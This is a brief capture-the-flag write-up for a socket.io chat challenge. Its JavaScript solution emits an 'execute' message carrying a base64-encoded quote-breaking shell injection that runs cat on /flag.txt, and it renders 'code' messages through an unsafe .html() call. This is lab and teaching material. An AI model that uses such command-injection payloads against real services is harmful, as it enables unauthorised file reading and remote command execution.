# Write-up

The flag is in the page source.


```javascript
var socket = io();

socket.on('chat message', function(msg){
  console.log(msg.command);
  if (msg.command === "code") {
    $('#messages').append($('<li>').html("<pre>" + msg.message + "</pre>"));
  } else {
    $('#messages').append($('<li>').text(msg.message));
  }
  window.scrollTo(0, document.body.scrollHeight);
});

socket.emit('chat message', {command:"execute", message: btoa(".';cat '/flag.txt")});

```
